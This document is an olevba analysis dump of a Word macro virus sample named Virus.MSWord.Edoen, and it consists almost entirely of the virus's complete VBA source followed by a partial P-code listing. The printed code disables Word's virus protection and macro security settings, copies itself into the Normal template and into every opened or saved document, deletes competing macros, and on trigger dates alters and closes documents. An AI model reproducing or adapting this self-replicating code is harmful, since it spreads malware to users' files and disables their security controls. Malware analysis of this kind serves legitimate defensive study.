olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Edoen
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Edoen - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO edoen.bas 
in file: Virus.MSWord.Edoen - OLE stream: 'Macros/VBA/edoen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Program pagujud
Public AD As Object
Public NT As Object
Public jum As Integer
Sub Document_Open()
On Error Resume Next
WordBasic.DisableAutoMacros True
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Options.VirusProtection = False
Options.ConfirmConversion = False
Options.SaveNormalPrompt = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "edoen") = "Sim salabim edoens"
End If
edoen.Amang
edoen.CopyDot
If cekNormal() = False Then edoen.Con
WordBasic.DisableAutoMacros True
End Sub
Private Sub Document_New()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Options.VirusProtection = False
Options.ConfirmConversion = False
Options.SaveNormalPrompt = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "edoen") = "Sim salabim edoens"
End If
edoen.CopytoAD
End Sub
Sub FileTemplates()
edoen.CopytoAD
edoen.copYtoNT
End Sub
Sub FileExit()
On Error Resume Next
edoen.Amang
edoen.CopyDot
If cekNormal() = False Then edoen.Con
NormalTemplate.Save
Application.Quit
End Sub
Sub ToolsMacro()
dodol = MsgBox("Sorry teubisa dipake Mang !!!", vbInformation, "Berbahaya")
End Sub
Sub FileNew()
Dialogs(wdDialogFileNew).show
edoen.CopytoAD
End Sub
Sub FileSave()
On Error Resume Next
edoen.CopytoAD
ActiveDocument.Save
End Sub
Sub AutoExec()
On Error Resume Next
WordBasic.DisableInput 1
WordBasic.DisableAutoMacros True
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Options.VirusProtection = False
'Options.ConfirmConversion = False
Options.SaveNormalPrompt = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "edoen") = "Sim salabim edoens"
End If
'If cekNormal() <> True Then edoen.sinA
If cekNormal() = False Then edoen.Con
WordBasic.DisableAutoMacros True
Application.EnableCancelKey = wdCancelDisabled
AddIns.Unload False
edoen.Amang
Application.OnTime when:=Now + TimeValue("00:01:00"), Name:="edoen.rame1"
End Sub
Sub FileOpen()
On Error Resume Next
edoen.Amang
WordBasic.DisableAutoMacros True
If Dialogs(80).show <> 0 Then
edoen.CopytoAD
GoTo way
End If
edoen.CopytoAD
way:
End Sub
Sub AutoOpen()
On Error GoTo way
WordBasic.DisableAutoMacros True
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "edoen") = "Sim salabim edoens"
End If
way:
On Error Resume Next
WordBasic.DisableAutoMacros False
edoen.CopytoAD
edoen.copYtoNT
edoen.CopytoAD
NormalTemplate.Save
End Sub
Sub Amang()
    On Error Resume Next
    WordBasic.DisableAutoMacros True
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.ConfirmConversions = False
If cekNormal = True Then ayaeuY = True
If CekDocument = True Then ayaDoc = True
If ayaeuY = False Then edoen.copYtoNT
If ayaDoc = False Then edoen.CopytoAD
End Sub
Sub CopyDot()
On Error Resume Next
tempat = Options.DefaultFilePath(wdStartupPath)
copi = Dir(tempat + "\News.Dot")
If copi = "" Then
Set simpan = NormalTemplate.OpenAsDocument
With simpan
    .SaveAs fileName:=tempat + "\News.dot"
    .Close SaveChanges:=wdDoNotSaveChanges
End With
End If
tempat = Options.DefaultFilePath(wdProgramPath)
copi = Dir(tempat + "\offic.hlp")
tempat = tempat + "\offic.hlp"
gg = VBE.ActiveVBProject.VBComponents.Count
If copi = "" Then
Application.VBE.ActiveVBProject.VBComponents("edoen").Export tempat
End If
tempat = Options.DefaultFilePath(wdProgramPath)
copi = Dir(tempat + "\offic1.hlp")
tempat = tempat + "\offic1.hlp"
gg = VBE.ActiveVBProject.VBComponents.Count
If copi = "" Then
Application.VBE.ActiveVBProject.VBComponents("form").Export tempat
End If
End Sub
Sub pesan()
On Error Resume Next
hari = Day(Date)
bulan = Month(Date)
tahun = Year(Date)
If (hari >= 22 And (bulan = 11)) Or ((hari <= 15) And (bulan = 12)) Then
    form.show
End If
If (bulan >= 1) And (tahun >= 2001) Then
If (hari = 2) Or (hari = 5) Or (hari = 8) Or (hari = 13) Or (hari = 16) Or (hari = 21) Or (hari = 26) Or (hari = 27) Or (hari = 29) Then
edoen.bAntai
form.show
ActiveDocument.Save
End If
End If
End Sub
Sub Con()
    On Error Resume Next
On Error Resume Next
tempat = Options.DefaultFilePath(wdProgramPath)
copi = Dir(tempat + "\offic.hlp")
If copi <> "" Then
copi1 = tempat + "\offic.hlp"
NormalTemplate.VBProject.VBComponents.Import copi1
End If
tempat = Options.DefaultFilePath(wdProgramPath)
copi = Dir(tempat + "\offic1.hlp")
If copi <> "" Then
copi1 = tempat + "\offic1.hlp"
NormalTemplate.VBProject.VBComponents.Import copi1
End If
End Sub
Sub ViewVBCode()
    On Error Resume Next
MsgBox "not installed this section"
End Sub
Sub bAntai()
On Error Resume Next
Selection.InsertBefore Chr(13) + "Kudekap Tubuhmu" + Chr(13) + "Kukecup dahimu" + Chr(13) + "Kulumat Bibirmu" + Chr(13) + "Kutelusuri Seluruh Lekuk Tubuhmu" _
+ Chr(13) + "Ku Berdiri dan tersenyum" + Chr(13) + "Sambil Berlalu ku Ucapkan Selamat Tinggal" + Chr(13)
Selection.Font.Size = 14
Selection.Font.Italic = wdToggle
Selection.Font.Animation = wdAnimationShimmer
ActiveDocument.Select
ActiveDocument.UndoClear
ActiveDocument.Save
ActiveDocument.Close
End Sub
Function CopytoAD()
    On Error Resume Next
    WordBasic.DisableAutoMacros True
    ayaDoc = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    aya = 0
    For i = 1 To AD.VBProject.VBComponents.Count
      Namacr = AD.VBProject.VBComponents(i).Name
      If Namacr = "edoen" Then ayaDoc = True
      If (Namacr <> "edoen") And (Namacr <> "ThisDocument") And (Namacr <> "Reference to Normal") And (Namacr <> "form") And (Namacr <> "") Then
          MsgBox ("Sorry proses penghapusan virus macro " & Namacr), vbInformation, "Perhatian"
                Application.OrganizerDelete Source:=AD.FullName, _
          Name:=Namacr, Object:=wdOrganizerObjectProjectItems
          ActiveDocument.Save
      End If
    Next i
    If ayaDoc = False Then
    Application.OrganizerCopy Source:=NT.FullName, Destination:=AD.FullName, Name:="edoen", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "form", Object:=wdOrganizerObjectProjectItems
      AD.ReadOnlyRecommended = False
      ss = ActiveDocument.Name
      If "Document" <> Mid(ss, 1, 8) Then
        ActiveDocument.Save
      End If
      End If
      WordBasic.DisableAutoMacros True
End Function

Function copYtoNT()
    On Error Resume Next
    ayaDoc = False
    ayanor = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    For i = 1 To NT.VBProject.VBComponents.Count
      nmacr = NT.VBProject.VBComponents(i).Name
      If nmacr = "edoen" Then ayanor = True
      If (nmacr <> "edoen") And _
        (nmacr <> "ThisDocument") And (nmacr <> "Reference to Normal") And (nmacr <> "form") And (nmacr <> "") Then
       MsgBox ("sorry proses penghapusan virus macro " & nmacr), vbInformation, "Proses Pembasmian"
                Application.OrganizerDelete Source:=NT.FullName, _
          Name:=nmacr, Object:=wdOrganizerObjectProjectItems
          NormalTemplate.Save
      End If
    Next i
If ayanor = False Then
    Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "edoen", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "form", Object:=wdOrganizerObjectProjectItems
          NormalTemplate.Save
End If
edoen.CopyDot
End Function
Function cekNormal() As Boolean
    On Error Resume Next
    ayanor = False
    Set NT = NormalTemplate
    For i = 1 To NT.VBProject.VBComponents.Count
      nmacr = NT.VBProject.VBComponents(i).Name
      If nmacr = "edoen" Then
      ayanor = True
      i = 100
      End If
    Next i
cekNormal = ayanor
End Function
Function CekDocument() As Boolean
    On Error Resume Next
    ayanor = False
    Set NT = ActiveDocument
    For i = 1 To NT.VBProject.VBComponents.Count
      nmacr = NT.VBProject.VBComponents(i).Name
      If nmacr = "edoen" Then
      ayanor = True
      i = 100
      End If
    Next i
    CekDocument = ayanor
End Function
Sub sinA()
tempat = Options.DefaultFilePath(wdStartupPath)
copi = tempat + "\*.dot"
Application.FileSearch.fileName = copi
Application.FileSearch.Execute
For i = 1 To Application.FileSearch.FoundFiles.Count
copi = Application.FileSearch.FoundFiles.Item(i)
If copi <> "news.dot" Then
edoen.CopytoAD
Application.Documents.Open (copi)
edoen.CopytoAD
Application.Documents.Close (Save)
End If
End Sub
Sub rame1()
pos = Options.DefaultFilePath(wdGraphicsFiltersPath)
If pos <> "" Then
Options.DefaultFilePath(wdStartupPath) = pos
edoen.CopyDot
End If
Application.OnTime when:=Now + TimeValue("01:00:00"), Name:="edoen.rame"
End Sub
Sub rame()
Application.Caption = "Cianjur Merdeka"
edoen.copYtoNT
edoen.CopytoAD
Application.OnTime when:=Now + TimeValue("01:00:00"), Name:="edoen.sory"
End Sub
Sub sory()
On Error Resume Next
edoen.pesan
edoen.rame
End Sub
Sub FilePrintPreview()
On Error Resume Next
edoen.copYtoNT
edoen.CopytoAD
ActiveDocument.PrintPreview
End Sub

-------------------------------------------------------------------------------
VBA MACRO form.frm 
in file: Virus.MSWord.Edoen - OLE stream: 'Macros/VBA/form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 













































































Dim d As Integer
Dim tek As Integer
Dim txt As String
Private Sub CommandButton1_Click()
MsgBox "Anda belum beruntung silahkan coba lagi"
End Sub

Private Sub CommandButton1_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
Label2.Visible = False
atas = Rnd * 123
kiri = Rnd * 222
CommandButton1.Top = atas
CommandButton1.Left = kiri
d = d + 2
Label1.Caption = Mid(txt, 1, d)
If d >= Len(txt) Then
    d = 0
    Label1.Caption = ""
End If
End Sub

Private Sub Label1_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
tek = 2
End
End Sub

Private Sub UserForm_Activate()
'tempat = Options.DefaultFilePath(wdPicturesPath)
'form.Picture = tempat
Label2.Visible = True
Label2.Caption = "Salam buat semua teman-teman sepergerakan alumni SMUN Sukanagara"
d = 0
tek = 0
If (Day(Date) <= 4) And (Month(Date) = 1) Then
form.Caption = "Tahun Baru dimana mang !!!!!"
txt = "Selamat Tahun Baru, semoga ditahun yang baru ini kita mendapatkan kebahagiaan, Amin ...... Jika anda ingin mengakhirinya double klik pada tulisan ini     "
ElseIf (Day(Date) > 4) And (Month(Date) >= 1) And (Year(Date) >= 2001) Then
form.Caption = "Ah abdimah iseng wungkul"
txt = "Ini hanya program iseng saja tidak akan merusak file anda, jika anda ingin mengakhirinya double klik pada tulisan ini     "
ElseIf (Day(Date) = 4) And (Month(Date) >= 2) Then
form.Caption = "Ulang tahun Perlu dirayakan ?"
txt = "Selamat Ulang Tahun yang lahir pada tanggal 4, semoga menjadi lebih dewasa dan mendapatkan kebahagiaan, Amin ...... Jika anda ingin mengakhirinya double klik pada tulisan ini     "
'Else
'form.Caption = "Selamat Menunaikan ibadah Puasa"
'txt = "Yaa ayyuhalladzina aamanu kutiba alaikumusshiam kama kutiba alalladzina minkoblikum laallakum tattakuun, jika anda ingin mengakhirinya double klik pada tulisan ini    "
End If
Randomize
Label1.Caption = "Silahkan anda coba klik tombol OK sampai bisa dan baca tulusan yang ada dibawah, semoga anda berhasil"
End Sub

Private Sub UserForm_Terminate()
On Error Resume Next
If tek <> 2 Then
form.Hide
vv = MsgBox("Ceuk aing double clik tulisan nana", vbInformation, "Teungawaro")
form.UndoAction
form.show
tek = 1
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Edoen
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1122 bytes
' Macros/VBA/edoen - 17014 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000F "Program pagujud"
' Line #1:
' 	Dim (Public) 
' 	VarDefn AD (As Object)
' Line #2:
' 	Dim (Public) 
' 	VarDefn NT (As Object)
' Line #3:
' 	Dim (Public) 
' 	VarDefn jum (As Integer)
' Line #4:
' 	FuncDefn (Sub Document_Open())
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #7:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #8:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #9:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #10:
' 	ElseBlock 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversion 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #14:
' 	LitStr 0x0012 "Sim salabim edoens"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0005 "edoen"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld edoen 
' 	ArgsMemCall Amang 0x0000 
' Line #17:
' 	Ld edoen 
' 	ArgsMemCall CopyDot 0x0000 
' Line #18:
' 	ArgsLd cekNormal 0x0000 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld edoen 
' 	ArgsMemCall Con 0x0000 
' 	EndIf 
' Line #19:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Private Sub Document_New())
' Line #22:
' 	OnError (Resume Next) 
' Line #23:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #24:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #25:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #26:
' 	ElseBlock 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversion 
' Line #29:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #30:
' 	LitStr 0x0012 "Sim salabim edoens"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0005 "edoen"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	Ld edoen 
' 	ArgsMemCall CopytoAD 0x0000 
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Sub FileTemplates())
' Line #35:
' 	Ld edoen 
' 	ArgsMemCall CopytoAD 0x0000 
' Line #36:
' 	Ld edoen 
' 	ArgsMemCall copYtoNT 0x0000 
' Line #37:
' 	EndSub 
' Line #38:
' 	FuncDefn (Sub FileExit())
' Line #39:
' 	OnError (Resume Next) 
' Line #40:
' 	Ld edoen 
' 	ArgsMemCall Amang 0x0000 
' Line #41:
' 	Ld edoen 
' 	ArgsMemCall CopyDot 0x0000 
' Line #42:
' 	ArgsLd cekNormal 0x0000 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld edoen 
' 	ArgsMemCall Con 0x0000 
' 	EndIf 
' Line #43:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #44:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Sub ToolsMacro())
' Line #47:
' 	LitStr 0x001D "Sorry teubisa dipake Mang !!!"
' 	Ld vbInformation 
' 	LitStr 0x0009 "Berbahaya"
' 	ArgsLd MsgBox 0x0003 
' 	St dodol 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Sub FileNew())
' Line #50:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall show 0x0000 
' Line #51:
' 	Ld edoen 
' 	ArgsMemCall CopytoAD 0x0000 
' Line #52:
' 	EndSub 
' Line #53:
' 	FuncDefn (Sub FileSave())
' Line #54:
' 	OnError (Resume Next) 
' Line #55:
' 	Ld edoen 
' 	ArgsMemCall CopytoAD 0x0000 
' Line #56:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Sub AutoExec())
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #61:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #62:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #63:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #64:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #65:
' 	ElseBlock 
' Line #66:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #67:
' 	QuoteRem 0x0000 0x0021 "Options.ConfirmConversion = False"
' Line #68:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #69:
' 	LitStr 0x0012 "Sim salabim edoens"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0005 "edoen"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	QuoteRem 0x0000 0x0026 "If cekNormal() <> True Then edoen.sinA"
' Line #72:
' 	ArgsLd cekNormal 0x0000 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld edoen 
' 	ArgsMemCall Con 0x0000 
' 	EndIf 
' Line #73:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #74:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #75:
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #76:
' 	Ld edoen 
' 	ArgsMemCall Amang 0x0000 
' Line #77:
' 	Ld Now 
' 	LitStr 0x0008 "00:01:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed when 
' 	LitStr 0x000B "edoen.rame1"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #78:
' 	EndSub 
' Line #79:
' 	FuncDefn (Sub FileOpen())
' Line #80:
' 	OnError (Resume Next) 
' Line #81:
' 	Ld edoen 
' 	ArgsMemCall Amang 0x0000 
' Line #82:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #83:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #84:
' 	Ld edoen 
' 	ArgsMemCall CopytoAD 0x0000 
' Line #85:
' 	GoTo way 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	Ld edoen 
' 	ArgsMemCall CopytoAD 0x0000 
' Line #88:
' 	Label way 
' Line #89:
' 	EndSub 
' Line #90:
' 	FuncDefn (Sub AutoOpen())
' Line #91:
' 	OnError way 
' Line #92:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #93:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #94:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #95:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #96:
' 	ElseBlock 
' Line #97:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #98:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #99:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #100:
' 	LitStr 0x0012 "Sim salabim edoens"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0005 "edoen"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #101:
' 	EndIfBlock 
' Line #102:
' 	Label way 
' Line #103:
' 	OnError (Resume Next) 
' Line #104:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #105:
' 	Ld edoen 
' 	ArgsMemCall CopytoAD 0x0000 
' Line #106:
' 	Ld edoen 
' 	ArgsMemCall copYtoNT 0x0000 
' Line #107:
' 	Ld edoen 
' 	ArgsMemCall CopytoAD 0x0000 
' Line #108:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Sub Amang())
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #113:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #114:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #115:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #116:
' 	Ld cekNormal 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ayaeuY 
' 	EndIf 
' Line #117:
' 	Ld CekDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ayaDoc 
' 	EndIf 
' Line #118:
' 	Ld ayaeuY 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld edoen 
' 	ArgsMemCall copYtoNT 0x0000 
' 	EndIf 
' Line #119:
' 	Ld ayaDoc 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld edoen 
' 	ArgsMemCall CopytoAD 0x0000 
' 	EndIf 
' Line #120:
' 	EndSub 
' Line #121:
' 	FuncDefn (Sub CopyDot())
' Line #122:
' 	OnError (Resume Next) 
' Line #123:
' 	Ld wdStartupPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St tempat 
' Line #124:
' 	Ld tempat 
' 	LitStr 0x0009 "\News.Dot"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	St copi 
' Line #125:
' 	Ld copi 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #126:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd OpenAsDocument 
' 	Set simpan 
' Line #127:
' 	StartWithExpr 
' 	Ld simpan 
' 	With 
' Line #128:
' 	Ld tempat 
' 	LitStr 0x0009 "\News.dot"
' 	Add 
' 	ParamNamed fileName 
' 	ArgsMemCallWith SaveAs 0x0001 
' Line #129:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	ArgsMemCallWith Close 0x0001 
' Line #130:
' 	EndWith 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	Ld wdProgramPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St tempat 
' Line #133:
' 	Ld tempat 
' 	LitStr 0x000A "\offic.hlp"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	St copi 
' Line #134:
' 	Ld tempat 
' 	LitStr 0x000A "\offic.hlp"
' 	Add 
' 	St tempat 
' Line #135:
' 	Ld VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St gg 
' Line #136:
' 	Ld copi 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #137:
' 	Ld tempat 
' 	LitStr 0x0005 "edoen"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #138:
' 	EndIfBlock 
' Line #139:
' 	Ld wdProgramPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St tempat 
' Line #140:
' 	Ld tempat 
' 	LitStr 0x000B "\offic1.hlp"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	St copi 
' Line #141:
' 	Ld tempat 
' 	LitStr 0x000B "\offic1.hlp"
' 	Add 
' 	St tempat 
' Line #142:
' 	Ld VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St gg 
' Line #143:
' 	Ld copi 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #144:
' 	Ld tempat 
' 	LitStr 0x0004 "form"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #145:
' 	EndIfBlock 
